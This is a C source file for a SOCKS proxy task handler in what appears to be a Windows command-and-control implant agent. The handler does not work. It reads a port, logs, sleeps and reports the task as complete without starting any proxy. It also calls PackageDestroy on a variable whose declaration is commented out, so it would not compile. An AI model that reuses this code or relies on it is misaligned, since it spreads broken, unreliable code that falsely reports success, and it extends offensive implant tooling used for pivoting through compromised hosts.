#include "Tasks/Shell.h"

#include <windows.h>
#include "Package.h"

#ifdef INCLUDE_CMD_SOCKS

/**
 * @brief Start a socks proxy to the agent.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] arguments PARSER struct containing task data.
 * @return VOID
 */
VOID Socks(PCHAR taskUuid, PPARSER arguments)
{
    UINT32 nbArg = ParserGetInt32(arguments);

    if (nbArg == 0)
    {
        return;
    }

    UINT32 Port   = ParserGetInt32(arguments);
    // BYTE   Action = ParserGetByte(arguments);

    _dbg("[*] Starting SOCKS proxy on port %d ...", Port);

    Sleep(5000);

    // PPackage temp = PackageInit(0, FALSE);

    // Success
    PackageComplete(taskUuid, NULL);

CLEANUP:

    PackageDestroy(temp);

    return;
}

#endif  //INCLUDE_CMD_SOCKS
